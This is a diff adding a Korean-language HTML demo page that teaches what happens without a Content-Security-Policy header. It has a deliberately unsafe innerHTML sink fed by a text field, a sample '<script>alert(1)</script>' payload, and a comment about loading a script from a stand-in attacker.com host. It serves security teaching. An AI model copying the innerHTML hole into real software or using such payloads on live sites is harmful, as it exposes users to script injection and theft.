@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <title>[CSP 없음] XSS 자유롭게 실행</title>
+  <style>
+    body { font-family: monospace; max-width: 700px; margin: 40px auto; padding: 20px; }
+    .vuln { background: #ffe0e0; border: 2px solid #c00; padding: 10px; border-radius: 4px; }
+    .box { background: #f5f5f5; padding: 15px; margin: 15px 0; border-radius: 4px; }
+    code { background: #eee; padding: 2px 6px; }
+    input { width: 80%; padding: 6px; }
+    button { padding: 6px 14px; cursor: pointer; }
+    #output { min-height: 40px; padding: 10px; border: 1px solid #ccc; margin-top: 10px; }
+  </style>
+</head>
+<body>
+  <h2>[CSP 없음] XSS 실행 자유</h2>
+  <div class="vuln">
+    ⚠️ CSP 헤더 없음 → inline 스크립트, 외부 스크립트 모두 실행 가능<br>
+    DevTools → Network 탭에서 응답 헤더 확인: <strong>Content-Security-Policy 없음</strong>
+  </div>
+
+  <div class="box">
+    <h3>CSP란?</h3>
+    <p>Content Security Policy: 브라우저에게 어떤 출처의 리소스만 로드/실행할지 지시하는 HTTP 헤더</p>
+    <code>Content-Security-Policy: default-src 'self'; script-src 'self'</code>
+    <p>→ 자기 도메인의 스크립트만 실행, inline script 차단</p>
+  </div>
+
+  <h3>XSS 테스트</h3>
+  <input type="text" id="inputField" placeholder="<script>alert(1)</script>">
+  <button onclick="render()">출력</button>
+  <div id="output">여기에 출력됩니다</div>
+
+  <div class="box">
+    <h3>인라인 스크립트도 자유롭게 실행됨</h3>
+    <p>아래 버튼은 inline onclick 핸들러 - CSP 없으면 그냥 실행:</p>
+    <button onclick="alert('CSP 없음: inline 스크립트 실행!')">인라인 스크립트 실행</button>
+  </div>
+
+  <script>
+    // CSP 없음 → XSS 자유롭게 실행
+    function render() {
+      document.getElementById('output').innerHTML =
+        document.getElementById('inputField').value;
+    }
+
+    // 외부 스크립트도 로드 가능 (no CSP)
+    // <script src="http://attacker.com/malicious.js"></script> 도 실행됨
+  </script>
+</body>
+</html>
